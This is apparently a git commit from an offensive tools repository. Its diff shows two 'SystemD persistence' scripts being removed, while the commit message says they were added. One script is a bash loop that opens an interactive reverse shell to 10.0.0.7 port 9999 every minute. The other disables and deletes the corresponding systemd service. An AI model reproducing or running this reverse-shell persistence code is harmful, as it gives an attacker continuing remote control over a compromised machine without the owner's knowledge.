36897ff42f6b0d35c5114a54d2ac03498951f316
GenNiox <tburkhalter17@gmail.com>
2025-01-26 19:00:44 -0700

    Added SystemD Persistence Install/Uninstall Scripts

--- Tools/Persistence/SystemD_Persistence_Service/Persistence_Service.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-while true
-do
-	bash -i >& /dev/tcp/10.0.0.7/9999 0>&1
-	sleep 1m
-done
-
--- Tools/Persistence/SystemD_Persistence_Service/Uninstall.sh
+++
@@ -1,3 +0,0 @@
-systemctl disable Persistence_Service
-systemctl stop Persistence_Service && rm -Rf /srv/Persistence_Service && rm -f /etc/systemd/system/Persistence_Service.service
-systemctl daemon-reload
